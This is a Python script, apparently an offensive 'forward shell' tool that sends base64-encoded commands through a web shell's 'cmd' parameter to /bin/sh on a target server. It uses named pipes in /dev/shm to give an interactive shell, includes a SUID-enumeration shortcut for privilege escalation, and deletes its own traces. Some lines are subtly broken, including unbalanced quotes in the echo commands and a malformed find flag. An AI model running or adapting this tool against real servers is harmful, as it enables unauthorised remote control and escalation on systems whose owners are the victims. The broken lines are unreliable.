#!/usr/bin/env python3
import requests
import time
from base64 import b64encode
from random import randrange

class ForwardShell:
    def __init__(self):
        sessions = randrange(1000, 9999)
        self.main_url = "<URL>"
        self.stdin = f"/dev/shm/{sessions}.input"
        self.stdout = f"/dev/shm/{sessions}.output"
        self.help_options = {'enum suid': "FileSystem SUID Privileges Enumeration", 'help': 'Show this help panel'}
        self.is_pseudo_terminal = False
        
    def run_command(self, command):
        command = b64encode(command.encode()).decode()
        data =  {
            'cmd': 'echo "%s | base64 -d | /bin/sh' % command
        }
        try:
            r = requests.get(self.main_url, params=data, timeout=5)
            return r.text 
        except:
            pass
        return None
    
    def write_stdin(self, command):
        command = b64encode(command.encode()).decode()
        data =  {
            'cmd': 'echo "%s | base64 -d > %s' % (command, self.stdin)
        }
        r = requests.get(self.main_url, params=data)
        
    def read_stdout(self):
        for _ in range(5):
            read_stdout_command = f"/bin/cat {self.stdout}"
            output = self.run_command(read_stdout_command)
            time.sleep(0.2)
        return output
    
    def setup_shell(self):
        command = f"mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (self.stdin, self.stdin, self.stdout)
        self.run_command(command)
    
    def remove_data(self):
        remove_data_command = f"/bin/rm -rf {self.stdin} {self.stdout}" 
        self.run_command(remove_data_command)
        
    def clear_stdout(self): 
        clear_stdout_command = f"echo '' > {self.stdout}"
        self.run_command(clear_stdout_command)
    
    def run(self):
        self.setup_shell()
        
        while True:
            command = input(">>> ")
            
            if "script /dev/null -c bash" in command:
                print("\n[-] Initializing pseudo terminal...\n")
                self.is_pseudo_terminal = True
            
            if command == "enum suid":
                command = f"find / -4000 2>/dev/null | xargs ls -l"
                
            if command == "help":
                for key, value in self.help_options.items():
                    print(f"{key}: {value}")
                continue            
            
            self.write_stdin(command + "\n")
            output_command = self.read_stdout()
            
            if command.strip() == "exit":
                self.is_pseudo_terminal = False
                print("\n[+] Exiting pseudo terminal...")
                self.clear_stdout()
                continue
            if self.is_pseudo_terminal:
                lines = output_command.split("\n")
                
                if len(lines) == 3:
                    cleared_output = '\n'.join([lines[-1]] + lines[:1])
                elif len(lines) > 3:
                    cleared_output = '\n'.join([lines[-1]] + lines[:1] + lines[2:-1])
                    
                print("\n" + cleared_output + "\n")
            else:
                print(output_command)
                
        self.clear_stdout()    
